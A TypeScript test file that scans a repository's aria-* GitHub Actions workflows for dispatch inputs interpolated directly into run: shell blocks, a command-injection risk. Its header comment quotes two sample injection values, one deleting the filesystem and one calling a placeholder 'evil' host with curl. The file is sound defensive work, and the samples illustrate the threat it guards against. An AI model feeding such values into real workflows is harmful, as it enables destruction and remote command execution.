/**
 * Platform-wide invariant — Plan 024 v3 §B-3:
 *
 * No `.github/workflows/*.yml` may interpolate
 * `${{ github.event.inputs.<X> }}` directly inside a `run:` shell
 * block. Workflow inputs are attacker-controlled in the
 * workflow_dispatch trigger model; raw shell interpolation lets
 * `; rm -rf /` or `'; curl http://evil; #` execute. The fix lives
 * in three patterns:
 *
 *   1. Pass the input via an `env:` block on the step (or job).
 *   2. Inside the `run:` script, refer to the env var as `"$VAR"`
 *      with quoting + bash regex validation.
 *   3. For inter-job data flow, use `outputs:` + `$GITHUB_OUTPUT`
 *      + `needs.<job>.outputs.*` — env does not cross job
 *      boundaries.
 *
 * # Failure mode
 *
 * The invariant scans every workflow YAML for occurrences of
 * `${{ github.event.inputs.<name> }}` and reports the file:line of
 * each occurrence that lives inside a `run: |` (or `run: >`) block.
 * Allowed surfaces are:
 *
 *   - `env:` blocks (exempt — the raw value lands in an env var,
 *     and the run: script is expected to validate before use).
 *   - Top-level workflow `inputs:` definition (exempt — that is the
 *     declaration itself, not a usage site).
 *   - Step input parameters (e.g. `with:` blocks for actions) —
 *     individual actions are responsible for their own input
 *     validation; this invariant focuses on raw shell injection.
 *
 * Authors who genuinely need the value inside a script must:
 *   1. Add an `env:` block on the step.
 *   2. Inside `run:`, validate format with a bash regex before any
 *      use.
 */

import { readFileSync, readdirSync } from 'node:fs';
import { resolve, join } from 'node:path';

const REPO_ROOT = resolve(__dirname, '..', '..');
const WORKFLOWS_DIR = join(REPO_ROOT, '.github', 'workflows');

// Match BOTH spellings of a dispatch input: the legacy
// `${{ github.event.inputs.<name> }}` and the modern `${{ inputs.<name> }}`
// shorthand, with optional whitespace.
//
// WHY BOTH, found the hard way. This pattern matched only the legacy spelling,
// so a `run:` block interpolating `${{ inputs.runner_label }}` walked straight
// through a green invariant — which is exactly what the first draft of
// aria-runner-capability-probe.yml did, in the same change that added this fix.
// The two spellings splice the same operator-supplied text into the same shell;
// recognising one of them made the gate look like it enforced the rule while
// enforcing half of it.
//
// `inputs.` is matched with a leading boundary so it cannot also fire on
// `github.event.inputs.` (already covered by the first alternative) or on a
// longer identifier ending in `inputs`.
const INPUTS_INTERPOLATION_RE =
  /\$\{\{\s*(?:github\.event\.inputs\.[A-Za-z0-9_]+|inputs\.[A-Za-z0-9_]+)\s*\}\}/g;

interface Violation {
  readonly file: string;
  readonly lineNo: number;
  readonly line: string;
  readonly snippet: string;
}

function findRunBlockViolations(yamlPath: string): Violation[] {
  const text = readFileSync(yamlPath, 'utf-8');
  const lines = text.split('\n');
  const violations: Violation[] = [];

  // State machine: track whether we are inside a `run: |` (or `run: >`)
  // block. The block starts at a `run:` key followed by a multi-line
  // scalar indicator and continues until the indentation drops to or
  // below the `run:` key's indentation.
  let runBlockIndent: number | null = null;
  for (const [index, line] of lines.entries()) {
    const leadingWhitespace = line.match(/^(\s*)/);
    const indent = leadingWhitespace?.[1]?.length ?? 0;
    const trimmed = line.trimStart();

    // Detect run: |  /  run: >  block start (single-line `run: foo`
    // is rare in practice; we still scan it because `run: cmd ${{ ... }}`
    // is just as injectable).
    const runStart = trimmed.match(/^run:\s*([|>][-+]?)?(\s|$)/);
    if (runStart) {
      // Scan the same line for inline injections (`run: echo "${{ ... }}"`).
      collectInlineMatches(line, index + 1, yamlPath, violations);
      // Multi-line block: track indent until it drops back.
      if (runStart[1] === '|' || runStart[1] === '>') {
        runBlockIndent = indent;
      } else {
        runBlockIndent = null;
      }
      continue;
    }

    if (runBlockIndent !== null) {
      // We are inside a multi-line run block. Lines indented strictly
      // deeper than runBlockIndent belong to the block. Lines at or
      // below the runBlockIndent close the block.
      if (line.trim() === '' || indent > runBlockIndent) {
        collectInlineMatches(line, index + 1, yamlPath, violations);
      } else {
        runBlockIndent = null;
      }
    }
  }
  return violations;
}

function collectInlineMatches(
  line: string,
  lineNo: number,
  yamlPath: string,
  violations: Violation[],
): void {
  const matches = line.matchAll(INPUTS_INTERPOLATION_RE);
  for (const match of matches) {
    violations.push({
      file: yamlPath,
      lineNo,
      line,
      snippet: match[0],
    });
  }
}

// Plan 024 v3 §B-3 invariant scope is intentionally limited to ARIA-
// owned workflows (aria-*.yml). Repo-wide raw shell injection in
// non-ARIA workflows (deploy-digitalocean.yml, deploy-staging.yml,
// edge-agent-release.yml, sensor-ingestion-release.yml) is documented
// as ORPHAN-HIGH-* findings in docs/aria/reviews/orphan-findings.md
// for follow-up by the platform-CI plan; this invariant exists to
// prevent ARIA workflows from regressing on the same class.
const ARIA_WORKFLOW_PREFIX = 'aria-';

describe('aria-workflow-input-injection invariant (Plan 024 v3 §B-3)', () => {
  test('no aria-* workflow interpolates a dispatch input (${{ inputs.* }} or ${{ github.event.inputs.* }}) inside run: blocks', () => {
    const workflowFiles = readdirSync(WORKFLOWS_DIR)
      .filter((f) => f.startsWith(ARIA_WORKFLOW_PREFIX))
      .filter((f) => f.endsWith('.yml') || f.endsWith('.yaml'));
    expect(workflowFiles.length).toBeGreaterThan(0);

    const allViolations: Violation[] = [];
    for (const file of workflowFiles) {
      const yamlPath = join(WORKFLOWS_DIR, file);
      allViolations.push(...findRunBlockViolations(yamlPath));
    }

    if (allViolations.length > 0) {
      const summary = allViolations
        .map(
          (v) =>
            `  ${v.file.replace(REPO_ROOT + '/', '')}:${v.lineNo}\n` +
            `    ${v.line.trim()}\n` +
            `    => match: ${v.snippet}`,
        )
        .join('\n');
      throw new Error(
        `Plan 024 v3 §B-3 violation — raw \${{ github.event.inputs.* }} ` +
          `interpolation inside run: shell blocks:\n${summary}\n\n` +
          `Fix: move the input to an env: block on the step (or job), ` +
          `then reference it as "$VAR" inside run: with a regex validate ` +
          `before any shell use. For inter-job data flow, use outputs: + ` +
          `$GITHUB_OUTPUT + needs.<job>.outputs.*. See the canonical ` +
          `pattern in .github/workflows/aria-daily-report.yml after Plan ` +
          `024 §B-3.`,
      );
    }
  });
});
